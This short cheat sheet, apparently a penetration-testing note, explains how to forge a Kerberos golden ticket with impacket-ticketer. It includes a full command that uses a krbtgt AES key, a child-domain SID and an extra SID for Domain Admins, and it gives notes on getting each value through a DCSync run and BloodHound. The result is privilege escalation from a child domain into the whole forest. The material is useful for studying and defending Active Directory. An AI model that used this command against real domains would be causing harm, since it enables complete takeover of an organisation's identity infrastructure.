Prerequisites

  • You need administrator or HOST$ account to forge golden ticket.
  • You have to extract krbtgt aes256 key or NTLM hash.

Ticket Query

When you have full control on SUB domain DC

┌──(kali㉿kali)-[~/utils/Windows]
└─$ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
-domain sub.poseidon.yzx \
-extra-sid S-1-5-21-1190331060-1711709193-932631991-512 \
 administrator -extra-pac
  • -aesKey : You can extract it with impacket-secretsdump via DCsync attack.
  • -domain-sid : You can get it via BloodHound.
  • -domain : simply input domain name
  • -extra-sid : You can include group SID, which gives you strong privilege. ex) -512 : domain admins, -519 : Enterprise Admins
  • TARGET : often administrator or privileged user.
  • -extra-pac : Attach Privilege Attribute Certificate
